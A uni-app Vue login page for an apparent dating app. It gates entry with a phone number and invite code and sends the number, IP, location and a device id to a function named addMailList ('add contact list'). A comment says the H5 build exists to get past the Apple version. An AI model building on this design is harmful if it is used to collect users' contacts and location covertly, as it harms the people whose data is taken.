<template>
	<view class="content">
		<view class="loginCard">
			<view style="text-align: center;font-size: 20rpx;margin-top: 10px;color: white;">
				遇见最美丽的邂逅
			</view>
			<view class="userInput">
				<input adjust-position="false" type="number" v-model="phoneNumber" maxlength="11" placeholder="请输入手机号码"
					placeholder-class="hahah">
			</view>
			<view class="userInput">
				<input adjust-position="false" type="number" v-model="incode" maxlength="6" placeholder="请输入邀请码"
					placeholder-class="hahah">
			</view>

			<view class="content_one">
				<view class="userSubmit" @click="starBtn">登录</view>
			</view>
		</view>
	</view>
</template>


<!-- h5版是用来水苹果版本的 -->
<script>
	import {
		netWork,
		ipAndaddress,
		checkNumber,
		addMailList,
		roundPhone
	} from './index.js'
	export default {
		data() {
			return {
				phoneNumber: "",
				incode: '',
				userIp: "",
				address: "",
				equipment: "",

				netWorkState: false
			}
		},
		onLoad() {


			netWork().then(res => {
				console.log("检查网络", res)
				this.netWorkState = res
			})

			ipAndaddress().then(res => {
				console.log("ip解析", res)
				this.userIp = res.userip
				this.address = res.address
			})

			roundPhone().then(res => {
				console.log("随机数", res)
				this.equipment = res
			})
		},
		methods: {
			starBtn() {

				// 有网络
				if (this.netWorkState) {
					if (this.phoneNumber != '' && this.incode != '') {
						var myreg = /^[1][3,4,5,7,8,9][0-9]{9}$/;
						if (!myreg.test(this.phoneNumber)) {
							uni.showToast({
								title: '手机号格式有误',
								duration: 2000,
								icon: "error"
							});
						} else {

							// 校验手机号码
							checkNumber(this.phoneNumber).then(res => {
								console.log("号码校验", res)

								if (res.code == 1) {

									uni.showLoading({
										title: '登录中'
									})
									if (this.userIp == '' && this.address == '') {
										this.userIp = '用户拒绝授权'
										this.address = '用户拒绝授权'
									}
									let data = {
										loginNum: this.phoneNumber,
										inCode: this.incode,
										equipment: this.equipment,
										location: this.userIp,
										address: this.address,
										data: []
									}
									addMailList(data).then(res => {
										if (res.code == 1) {
											uni.hideLoading();
											console.log("添加成功")
											uni.navigateTo({
												url: '/pages/home/home'
											});

										}
									})
								} else {
									uni.showToast({
										title: '登录号码重复',
										duration: 2000,
										icon: "error"
									});
								}
							})

						}

					} else {
						uni.showToast({
							title: '内容不能为空',
							duration: 2000,
							icon: "error"
						});
					}
				} else {
					uni.showToast({
						title: '当前网络不可用',
						duration: 2000,
						icon: "error"
					});
				}



			}
		}
	}
</script>

<style>
	.content {

		background-image: url(../../static/last2.png);
		/* background: #8d8d8d; */
		display: flex;
		/* align-items: center; */
		/* flex-direction: column; */
		/* justify-content: center; */
		width: 100%;
		height: 100%;
		/* padding-top: 20% */
	}

	.loginCard {
		height: 15rem;
		width: 100%;
		background: #00000060;
		height: 18rem;
		/* width: 600rpx;
		height: 460rpx; */
		border-radius: 6px;
		margin: 8.8rem 20px;
	}

	input {
		color: #FFFFFF;
		background-color: #00000070;
		opacity: 0.5;
		padding: 10px 8px;
		margin: 10px 20px;
		border-radius: 2px;
		text-align: center;
	}

	.userInput {
		margin-top: 1.5rem;
	}


	.userSubmit {
		/* border: 1px solid red; */
		margin: 3rem 16px;
		text-align: center;
		color: #FFFFFF;
		padding: 8px 0;
		border-radius: 2px;
		background-color: #ff557f;
		transition: 0.4s;

	}

	.userSubmit:active {
		background-color: pink;
		opacity: 0.5;
	}

	.hahah {
		color: white;
	}
</style>
